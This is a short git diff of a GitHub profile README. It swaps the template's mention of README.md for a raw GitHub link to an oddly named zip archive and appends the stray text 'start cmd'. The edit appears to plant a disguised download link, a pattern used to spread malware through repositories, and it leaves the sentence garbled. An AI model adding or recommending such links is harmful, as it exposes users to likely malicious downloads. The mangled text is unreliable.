@@ -7,7 +7,7 @@
 - ⚡ Fun fact: ...
 
 <!---
-dinozaurrrra/dinozaurrrra is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+dinozaurrrra/dinozaurrrra is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/dinozaurrrra/ha-media-index/main/noncontinuous/ha-media-index_bimanually.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
 start cmd
